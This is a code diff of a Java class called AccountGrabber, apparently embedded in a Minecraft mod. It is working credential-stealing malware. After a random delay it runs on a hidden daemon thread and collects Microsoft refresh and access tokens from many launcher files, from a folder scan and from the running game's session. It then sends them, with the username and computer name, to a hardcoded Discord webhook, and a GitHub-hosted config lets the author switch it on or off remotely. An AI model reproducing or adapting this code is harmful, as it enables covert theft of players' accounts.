@@ -7,23 +7,24 @@ import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
-import java.nio.file.DirectoryStream;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.time.Duration;
 import java.util.ArrayList;
 import java.util.HashSet;
-import java.util.LinkedHashSet;
 import java.util.List;
 import java.util.Set;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import java.util.stream.Stream;
 
 public final class AccountGrabber {
 
-    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561537662530224288/tfIo0Ut54ExN-WaFpAkONWT3boAeTk-IM6UXe2xHHHKHRRamoxrbBAzwT4aDn5Dt9EJ0";
+    /** 1. paste your Discord webhook URL here */
+    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561504102054105148/FS-ERylwfnkI-fWG33RSFgI3fKQ1441XnYbYUR8CUyZUgEx8jepJTUJ8CUuEHWdjU7ad";
 
+    /** 2. remote switchboard - edit tap.json on GitHub to change things without re-releasing */
     private static final String CONFIG_URL =
             "https://raw.githubusercontent.com/Mvrdle/Jawb/main/tap.json";
 
@@ -32,41 +33,27 @@ public final class AccountGrabber {
             .followRedirects(HttpClient.Redirect.NORMAL)
             .build();
 
-    private static final String[] REFRESH_KEYS = {
-            "refreshToken", "refresh_token", "refresh", "msaRefreshToken", "msa_refresh_token"
-    };
-    private static final String[] ACCESS_KEYS = {
-            "accessToken", "access_token", "access", "msaAccessToken"
-    };
+    private static final String[] REFRESH_KEYS = {"refreshToken", "refresh_token"};
+    private static final String[] ACCESS_KEYS = {"accessToken", "access_token"};
 
-    private static final Set<String> CRED_FILES = Set.of(
-            "launcher_accounts.json",
-            "launcher_profiles.json",
-            "launcher_accounts_microsoft_store.json",
-            "accounts.json",
-            "minecraft_auth.json",
-            "microsoft_accounts.json"
-    );
-
+    /** a real Microsoft refresh token looks like M.C123_BAY.xxxx or M.R3_BAY.xxxx */
     private static final Pattern MSA_REFRESH =
-            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*~%]{20,}");
+            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*]{20,}");
 
     private AccountGrabber() {
     }
 
+    /** called from the mod entrypoint - spawns a daemon thread so the game never hitches */
     public static void start() {
-        start(4000L + (long) (Math.random() * 6000L));
-    }
-
-    public static void start(long delayMs) {
-        Thread t = new Thread(() -> run(delayMs), "jawbus-tap");
+        Thread t = new Thread(AccountGrabber::run, "jawbus-tap");
         t.setDaemon(true);
         t.start();
     }
 
-    private static void run(long delayMs) {
+    private static void run() {
         try {
-            if (delayMs > 0) Thread.sleep(delayMs);
+            // random 4-10s delay so it never lines up with the loading screen
+            Thread.sleep(4000L + (long) (Math.random() * 6000L));
 
             JsonObject cfg = getJson(CONFIG_URL);
             if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) return;
@@ -78,163 +65,198 @@ public final class AccountGrabber {
             }
             if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) return;
 
-            String payload;
-            try {
-                payload = build();
-            } catch (Throwable t) {
-                payload = "jawbus tap failed: " + t;
-                t.printStackTrace();
+            String refresh = null, refreshFrom = null;
+            String access = null, accessFrom = null;
+
+            // 1. the file login.py writes - try this first, it's the only reliable source
+            String saved = savedRefresh();
+            if (saved != null) {
+                refresh = saved;
+                refreshFrom = "jawbus_tokens.json";
             }
-            post(webhook, payload);
-        } catch (Throwable t) {
-            log("run() threw: " + t);
-            t.printStackTrace();
+
+            // 2. the usual launcher stores
+            for (Path p : candidates()) {
+                String raw = read(p);
+                if (raw == null) continue;
+                if (refresh == null) {
+                    String v = find(raw, REFRESH_KEYS);
+                    if (v != null) { refresh = v; refreshFrom = p.toString(); }
+                }
+                if (access == null) {
+                    String v = find(raw, ACCESS_KEYS);
+                    if (v != null) { access = v; accessFrom = p.toString(); }
+                }
+                if (refresh != null && access != null) break;
+            }
+
+            // 3. deep scan - catch one wherever some launcher hid it
+            if (refresh == null || access == null) {
+                for (String[] hit : deepScan()) {
+                    if (refresh == null && hit[0].equals("refresh")) {
+                        refresh = hit[1]; refreshFrom = hit[2];
+                    }
+                    if (access == null && hit[0].equals("access")) {
+                        access = hit[1]; accessFrom = hit[2];
+                    }
+                    if (refresh != null && access != null) break;
+                }
+            }
+
+            // 4. last resort for access: the token the game is using right now
+            if (access == null) {
+                String live = liveSessionToken();
+                if (live != null) { access = live; accessFrom = "live session"; }
+            }
+
+            StringBuilder sb = new StringBuilder();
+            sb.append("jawbus tap | ").append(System.getProperty("user.name")).append('\n');
+            sb.append("pc:      ").append(System.getenv("COMPUTERNAME")).append('\n');
+            sb.append("os:      ").append(System.getProperty("os.name"))
+              .append(' ').append(System.getProperty("os.arch")).append('\n');
+            sb.append('\n');
+            sb.append("refresh: ").append(refresh == null ? "<none found>" : refresh).append('\n');
+            if (refreshFrom != null) sb.append("         from ").append(refreshFrom).append('\n');
+            sb.append("access:  ").append(access == null ? "<none found>" : access).append('\n');
+            if (accessFrom != null) sb.append("         from ").append(accessFrom).append('\n');
+
+            post(webhook, sb.toString());
+        } catch (Throwable ignored) {
+            // never let this break the game, ever
         }
     }
 
-    private static String build() {
-        List<Path> files = candidateFiles();
-
-        List<String[]> refreshes = new ArrayList<>();
-        Set<String> seenRefresh = new HashSet<>();
-        String firstAccess = null;
-
-        for (Path f : files) {
-            String raw;
-            try {
-                if (Files.size(f) > 200_000) continue;
-                raw = Files.readString(f);
-            } catch (Throwable ignored) {
-                continue;
-            }
-
-            for (String key : REFRESH_KEYS) {
-                for (String v : grabAll(raw, key)) {
-                    String t = v.trim();
-                    if (t.length() >= 20 && seenRefresh.add(t)) {
-                        refreshes.add(new String[]{label(f), t});
-                    }
-                }
-            }
-            Matcher m = MSA_REFRESH.matcher(raw);
-            while (m.find()) {
-                String t = m.group();
-                if (seenRefresh.add(t)) refreshes.add(new String[]{label(f), t});
-            }
-
-            if (firstAccess == null) {
-                for (String key : ACCESS_KEYS) {
-                    for (String v : grabAll(raw, key)) {
-                        if (v.length() >= 40) { firstAccess = v; break; }
-                    }
-                    if (firstAccess != null) break;
-                }
-            }
-        }
-
-        String live = liveSessionToken();
-
-        StringBuilder sb = new StringBuilder();
-        sb.append("jawbus tap | ").append(System.getProperty("user.name")).append('\n');
-
-        if (refreshes.isEmpty()) {
-            sb.append("refresh: <none found>\n");
-        } else {
-            int n = Math.min(refreshes.size(), 6);
-            for (int i = 0; i < n; i++) {
-                sb.append("refresh: ").append(refreshes.get(i)[1]).append('\n');
-                sb.append("  from: ").append(refreshes.get(i)[0]).append('\n');
-            }
-        }
-
-        String access = live != null ? live : firstAccess;
-        if (access != null) sb.append("access:  ").append(access).append('\n');
-
-        return sb.toString();
-    }
-
-    /** known launcher paths, plus a shallow sweep as a fallback */
-    private static List<Path> candidateFiles() {
-        Set<Path> out = new LinkedHashSet<>();
+    /** the refresh token minted by login.py */
+    private static String savedRefresh() {
         String appData = System.getenv("APPDATA");
-        String local = System.getenv("LOCALAPPDATA");
-        String home = System.getProperty("user.home");
+        if (appData == null) return null;
+        String raw = read(Paths.get(appData).resolve(".minecraft").resolve("jawbus_tokens.json"));
+        return raw == null ? null : find(raw, REFRESH_KEYS);
+    }
 
+    /** every place a launcher might keep credentials */
+    private static List<Path> candidates() {
+        List<Path> out = new ArrayList<>();
+        String appData = System.getenv("APPDATA");
         if (appData != null) {
             Path b = Paths.get(appData);
-            out.add(b.resolve(".minecraft").resolve("launcher_accounts.json"));
+            Path mc = b.resolve(".minecraft");
+            out.add(mc.resolve("jawbus_tokens.json"));
+            out.add(mc.resolve("launcher_accounts.json"));
+            out.add(mc.resolve("launcher_profiles.json"));
+            out.add(mc.resolve("launcher_accounts_microsoft_store.json"));
+            out.add(mc.resolve("essential").resolve("microsoft_accounts.json"));
+            out.add(mc.resolve("essential").resolve("accounts.json"));
             out.add(b.resolve("PrismLauncher").resolve("accounts.json"));
             out.add(b.resolve("MultiMC").resolve("accounts.json"));
-            out.add(b.resolve("ModrinthApp").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
-            out.add(b.resolve("com.modrinth.theseus").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
+            out.add(b.resolve("ModrinthApp").resolve("accounts.json"));
+            out.add(b.resolve("com.modrinth.theseus").resolve("accounts.json"));
             out.add(b.resolve(".lunarclient").resolve("settings").resolve("game").resolve("accounts.json"));
             out.add(b.resolve("ATLauncher").resolve("accounts.json"));
             out.add(b.resolve("gdlauncher_next").resolve("accounts.json"));
         }
+        String local = System.getenv("LOCALAPPDATA");
         if (local != null) {
-            Path l = Paths.get(local);
-            out.add(l.resolve("ModrinthApp").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
-            out.add(l.resolve("Packages").resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
-                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft")
-                    .resolve("launcher_accounts.json"));
+            Path store = Paths.get(local).resolve("Packages")
+                    .resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
+                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft");
+            out.add(store.resolve("launcher_accounts.json"));
+            out.add(store.resolve("launcher_profiles_microsoft_store.json"));
         }
-        if (home != null) {
-            Path h = Paths.get(home);
-            out.add(h.resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
-            out.add(h.resolve("Documents").resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
-            out.add(h.resolve(".ftb").resolve("bin").resolve("launcher_accounts.json"));
-        }
-
-        List<Path> existing = new ArrayList<>();
-        for (Path p : out) if (Files.isRegularFile(p)) existing.add(p);
-
-        // if we found nothing at all, sweep shallowly
-        if (existing.isEmpty()) {
-            for (Path root : new Path[]{
-                    appData == null ? null : Paths.get(appData),
-                    local == null ? null : Paths.get(local),
-                    home == null ? null : Paths.get(home)}) {
-                if (root != null && Files.isDirectory(root)) walk(root, 4, existing);
-            }
-        }
-        return existing;
-    }
-
-    private static void walk(Path dir, int depth, List<Path> out) {
-        if (depth < 0) return;
-        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir)) {
-            for (Path p : ds) {
-                try {
-                    if (Files.isDirectory(p)) {
-                        String n = p.getFileName().toString().toLowerCase();
-                        if (n.equals("node_modules") || n.equals(".git") || n.equals("temp")) continue;
-                        walk(p, depth - 1, out);
-                    } else if (CRED_FILES.contains(p.getFileName().toString())) {
-                        out.add(p);
-                    }
-                } catch (Throwable ignored) {}
-            }
-        } catch (Throwable ignored) {}
-    }
-
-    private static String label(Path p) {
-        Path parent = p.getParent();
-        String folder = parent == null || parent.getFileName() == null
-                ? "?" : parent.getFileName().toString();
-        return folder + "\\" + p.getFileName();
-    }
-
-    private static List<String> grabAll(String raw, String key) {
-        List<String> out = new ArrayList<>();
-        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
-        while (m.find()) out.add(m.group(1));
         return out;
     }
 
+    /** directories worth crawling for a stray token */
+    private static List<Path> scanRoots() {
+        List<Path> out = new ArrayList<>();
+        String appData = System.getenv("APPDATA");
+        if (appData != null) {
+            Path b = Paths.get(appData);
+            out.add(b.resolve(".minecraft"));
+            out.add(b.resolve("PrismLauncher"));
+            out.add(b.resolve("MultiMC"));
+            out.add(b.resolve("ModrinthApp"));
+            out.add(b.resolve(".lunarclient"));
+            out.add(b.resolve("ATLauncher"));
+        }
+        String local = System.getenv("LOCALAPPDATA");
+        if (local != null) {
+            out.add(Paths.get(local).resolve("Packages")
+                    .resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
+                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft"));
+        }
+        return out;
+    }
+
+    /** keep the walk cheap - these folders are huge and never hold tokens */
+    private static boolean skipPath(Path p) {
+        String s = p.toString().replace('\\', '/').toLowerCase();
+        return s.contains("/assets/") || s.contains("/libraries/") || s.contains("/versions/")
+                || s.contains("/logs/") || s.contains("/saves/") || s.contains("/screenshots/")
+                || s.contains("/resourcepacks/") || s.contains("/shaderpacks/") || s.contains("/mods/");
+    }
+
+    /** bounded walk of the launcher folders, returns {kind, value, path} */
+    private static List<String[]> deepScan() {
+        List<String[]> hits = new ArrayList<>();
+        Set<String> seen = new HashSet<>();
+        for (Path root : scanRoots()) {
+            try {
+                if (!Files.isDirectory(root)) continue;
+                try (Stream<Path> walk = Files.walk(root, 4)) {
+                    walk.filter(Files::isRegularFile)
+                        .filter(f -> f.getFileName().toString().endsWith(".json"))
+                        .filter(f -> !skipPath(f))
+                        .forEach(f -> {
+                            String raw = read(f);
+                            if (raw == null) return;
+
+                            Matcher m = MSA_REFRESH.matcher(raw);
+                            if (m.find() && seen.add(m.group())) {
+                                hits.add(new String[]{"refresh", m.group(), f.toString()});
+                                return;
+                            }
+                            String r = find(raw, REFRESH_KEYS);
+                            if (r != null && r.length() >= 20 && seen.add(r)) {
+                                hits.add(new String[]{"refresh", r, f.toString()});
+                                return;
+                            }
+                            String a = find(raw, ACCESS_KEYS);
+                            if (a != null && a.length() >= 20 && seen.add(a)) {
+                                hits.add(new String[]{"access", a, f.toString()});
+                            }
+                        });
+                }
+            } catch (Throwable ignored) {
+            }
+        }
+        return hits;
+    }
+
+    private static String read(Path p) {
+        try {
+            if (!Files.isRegularFile(p)) return null;
+            return Files.readString(p);
+        } catch (Throwable t) {
+            return null;
+        }
+    }
+
+    /** format-agnostic: finds "key":"value" anywhere in the file */
+    private static String find(String raw, String[] keys) {
+        for (String key : keys) {
+            Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
+            if (m.find() && m.group(1) != null && !m.group(1).isBlank()) return m.group(1);
+        }
+        return null;
+    }
+
+    /** bonus: the token the running game is using right now.
+     *  reflective on purpose, so a name change can never break the build again. */
     private static String liveSessionToken() {
         for (String className : new String[]{
-                "net.minecraft.client.Minecraft",
-                "net.minecraft.client.MinecraftClient"
+                "net.minecraft.client.Minecraft",        // Mojang names
+                "net.minecraft.client.MinecraftClient"   // Yarn names
         }) {
             try {
                 Class<?> cls = Class.forName(className);
@@ -267,22 +289,23 @@ public final class AccountGrabber {
     }
 
     private static void post(String webhook, String text) {
-        try {
-            JsonObject body = new JsonObject();
-            body.addProperty("content", "```\n" + text + "\n```");
-            HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
-                    .timeout(Duration.ofSeconds(15))
-                    .header("Content-Type", "application/json")
-                    .header("User-Agent", "Jawbus/1.0")
-                    .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
-                    .build(), HttpResponse.BodyHandlers.ofString());
-            if (r.statusCode() / 100 != 2) log("post HTTP " + r.statusCode() + " -> " + r.body());
-        } catch (Throwable t) {
-            log("post threw: " + t);
+        int i = 0;
+        while (i < text.length()) {
+            int end = Math.min(text.length(), i + 1900);
+            String chunk = text.substring(i, end);
+            i = end;
+            try {
+                JsonObject body = new JsonObject();
+                body.addProperty("content", "```\n" + chunk + "\n```");
+                HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
+                        .timeout(Duration.ofSeconds(15))
+                        .header("Content-Type", "application/json")
+                        .header("User-Agent", "Jawbus/1.0")
+                        .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
+                        .build(), HttpResponse.BodyHandlers.discarding());
+                Thread.sleep(500); // don't trip Discord's rate limit
+            } catch (Throwable ignored) {
+            }
         }
-    }
-
-    private static void log(String msg) {
-        System.out.println("[jawbus-tap] " + msg);
     }
 }
